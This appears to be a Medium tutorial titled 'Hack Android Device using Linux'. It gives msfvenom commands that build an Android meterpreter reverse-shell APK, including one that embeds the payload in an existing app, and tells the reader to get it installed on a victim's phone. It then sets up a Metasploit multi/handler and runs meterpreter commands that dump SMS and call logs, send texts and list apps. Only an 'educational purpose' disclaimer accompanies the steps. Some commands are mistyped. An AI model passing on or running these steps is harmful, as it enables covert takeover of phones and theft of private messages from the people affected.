---
title: "Hack Android Device using Linux"
date: "2022-11-02"
summary: "In this article, we will be hacking an android device using Kali Linux. You need only a Linux based machine, a stable internet connection…"
tags: ["Security"]
cover: "https://cdn-images-1.medium.com/max/800/1*HHxT3kXpcykWfGMifAiReg.png"
canonical: "https://medium.com/@harshkahate/hack-android-device-using-linux-dad0dde8c0d5"
source: "Medium"
imported_from_medium: true
---
In this article, we will be hacking an android device using Kali Linux. You need only a Linux based machine, a stable internet connection and an android device (preferably rooted device) to perform this task.

Make sure that your Linux distribution is updated to the latest stable version before starting.

## Step 1 : Preparing the APK File / Payload

In this step, we need to create an APK file which will be transferred to the Android device later. This is nothing but the payload. This can be done using msfvenom command.

msfvenom helps to generate payloads for different platforms such as Windows, Android and much more. It contains standard command line options.

$ msfvenom—platform android -a dalvik -p android/meterpreter/reverse_tcp LHOST=192.168.0.106 -e generic/none -o venom.apk

Breaking down the command :

- ***-platform*** specifies the platform to be exploited. Ex. APK for Android, pdf/exe for Windows.
- ***-a**** *specifies the architecture to use.
- ***-p*** tells the console about the target system.
- ***meterpreter*** is the payload that helps to explore the target machine.
- ***reverse_tcp*** is the protocol for android devices to make a connection.
- ***Lhost**** / ****Lhos*** specifies the IP Address.
- ***Lport*** is the listening device's port, which will be used to monitor incoming data from the target.
- ***-e*** specifies the encoding options, here it is selected as none.
- ***-o*** saves the payload by the name provided after it.

Alternatively, if you already have an APK file available with you and if you wish to integrate the payload into it, you need to give the path of that APK file and -x option is used for the same.

$ msfvenom -x test.apk—platform android -a dalvik -p android/meterpreter/reverse_tcp LHOST=192.168.0.106 -e generic/none -o <path of the output file>

Once the payload is prepared, it must be transferred on the Android device of the victim using any transfer medium. It must be installed on the Android device. Make sure that the mobile is connected to the same network as the Linux machine and that the application has all the required permissions.

## Step 2 : Exploit using MSFconsole

Now, we will use MSFconsole in the further steps. It is to be used in a different terminal for the further process. MSFconsole provides a command line interface to access and work with the Metasploit Framework. You can read more on the Metasploit project if you wish to.

To start the MSFconsole, simply type the command below:

$ msfconsole

Once MSFconsole starts, we need to use the multi-handler. Handler with metasploit is useful when you need to connect to the victim's machine to take back the control.

msf6 > use exploit/multi/handler

Setting the payload, Lhost and Lport once again.

msf6 exploit(multi/handler) > set payload android/meterpreter/reverce_tcpmsf6 exploit(multi/handler) > set LHOST <IP Address of your machine>

![Using msfconsole and preparing for the exploit.](https://cdn-images-1.medium.com/max/800/1*aJWvfvmBzQGr4L1mM1hcAA.png)

Fire the exploit command to explore the target device.

msf6 exploit(multi/handler) > exploit

![Exploit command to start exploring the target device.](https://cdn-images-1.medium.com/max/800/1*z7hbtowIMgflUBN6Xe2D_A.png)

As you can see in the above image, meterpreter started a session on the target device.

## Step 3 : The actual exploit using meterpreter commands

Now you can start typing different commands to exploit the Android device. To see all the commands and there details, you can also type help.

Command 1 : *dump_sms*

This will dump all the SMS into a text file, as you can see in the below image.

![Use of dump_sms command.](https://cdn-images-1.medium.com/max/800/1*m8ggUprjCssqaIdFrT_qXw.png)

![Output of dump_sms in a text file.](https://cdn-images-1.medium.com/max/800/1*1BeS3l0aKJkkhi7aeGF2fQ.png)

Command 2 : *dump_calllog*

This will dump the entire call log into a text file, as you can see in the below image.

![Use of dump_calllog command.](https://cdn-images-1.medium.com/max/800/1*5hhtYi6qyHkZ-tFYCJVsFg.png)

![Output of dump_calllog command in a text file.](https://cdn-images-1.medium.com/max/800/1*pHqzeoMqMV1-QEiLod5rzA.png)

Command 3 : *send_sms -d -t "Text"*

Here, I sent a test message to my second number and it worked! I got the message!

![Use of send_sms command.](https://cdn-images-1.medium.com/max/800/1*iQwGQ5-alDR2qPV4UGCkeA.jpeg)

Command 4 : *app_list*

This command will show all the apps installed on the Android device, app's package, whether it is running or not and if it is a system app or not.

![Use and output of app_list command.](https://cdn-images-1.medium.com/max/800/1*BCnAzwArUym-uefUa_bqVw.png)

## Conclusion

- In this article, we hacked an android device using a payload.
- We created the APK file / payload using LAN. This can be done using port forwarding on WAN as well. We will cover that in the next article.
- Metasploit framework is something interesting to know, you can definitely read more about it.

Note : All the activities performed are for educational purpose only.